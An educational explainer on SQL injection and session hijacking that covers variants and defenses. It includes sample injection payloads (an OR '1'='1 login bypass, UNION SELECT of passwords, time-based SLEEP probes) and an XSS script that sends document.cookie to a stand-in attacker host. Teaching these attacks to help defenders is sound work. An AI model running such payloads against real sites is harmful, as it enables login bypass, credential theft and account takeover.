# SQL Injection 

**Plain:** attacker puts special text into a web input so the app sends a different SQL command to the database.

**Analogy:** the database is a librarian who does exactly what you say. If you whisper “find book by Alice” it’s fine — but if someone shouts “find book by Alice **or give me everything**” the librarian follows that, too.

---

## Vulnerable example (bad, do **not** use in production)

Imagine the server builds SQL by joining strings:

```sql
query = "SELECT * FROM users WHERE username = '" + user + "' AND password = '" + pass + "';"
```

If `user = admin` and `pass = anything' OR '1'='1`, the query becomes:

```sql
SELECT * FROM users WHERE username = 'admin' AND password = 'anything' OR '1'='1';
```

`'1'='1'` is always true → attacker logs in.

---

## Variants (short & concrete)

### 1. In-Band SQLi (attacker sees results directly)

* **Error-based**: craft input that causes DB error; error message leaks table/column names.
  *Example idea:* input that causes a type error so DB returns schema info (only if app shows errors).
* **Union-based**: use `UNION SELECT` to append attacker data to normal query results.
  *Example sketch:* if site shows search results, attacker uses `UNION SELECT username,password FROM users` to make the page show those rows.

### 2. Blind SQLi (no direct output; attacker asks yes/no)

* **Boolean (content-based):** put a condition that is true or false and observe page differences.
  *Example:* test `id=1 AND 1=1` (page normal) vs `id=1 AND 1=2` (page different) → you learn bits of data step-by-step.
* **Time-based:** make the DB sleep only when a condition is true and measure response time.
  *Example:* `id=1 AND IF(SUBSTRING(password,1,1)='a', SLEEP(5), 0)` — if response delays ~5s, first char = 'a'.

### 3. (Optional) Out-of-Band (OOB)

* DB causes a DNS/HTTP request to an attacker-controlled server to exfiltrate data. Works when direct output blocked.

---

## Quick defenses (simple)

1. **Parameterized queries / prepared statements** — *always* use them.
   Python example (safe):

   ```python
   cursor.execute("SELECT * FROM users WHERE username=%s AND password=%s", (user, password))
   ```
2. **Input validation**: if a field must be numeric, reject non-numbers.
3. **Least privilege DB user**: web app DB user should only read/write required tables (not `DROP`, not admin).
4. **Hide DB errors**: show generic error messages to users.
5. **Use ORM or stored procedures** where appropriate.
6. **WAF and monitoring** as defense-in-depth.

---

# Session Hijacking — simple + examples

**Plain:** attacker steals or reuses someone’s session token (cookie) and becomes that user.

**Analogy:** session ID = wristband at an event. If someone steals your wristband, they enter pretending to be you.

---

## Where session IDs live

* Usually in a **cookie** (or URL in very bad designs). Example cookie header:

```
Set-Cookie: session=abcd1234; HttpOnly; Secure; SameSite=Lax
```

---

## Common ways sessions are hijacked (with tiny examples)

* **XSS steals cookie:** malicious script reads `document.cookie` and sends it to attacker.
  *Example of what an attacker’s injected script might do (educational only):*
  `<script>fetch('https://attacker.example/steal?c='+encodeURIComponent(document.cookie))</script>`
* **Network eavesdropping (HTTP):** cookies sent over plain HTTP can be sniffed (use HTTPS!).
* **Session fixation:** attacker sets a session ID for the victim (e.g., via link), victim logs in with that ID, attacker reuses it.
* **Physical/shared machines / saved sessions:** someone uses a browser left logged in.

---

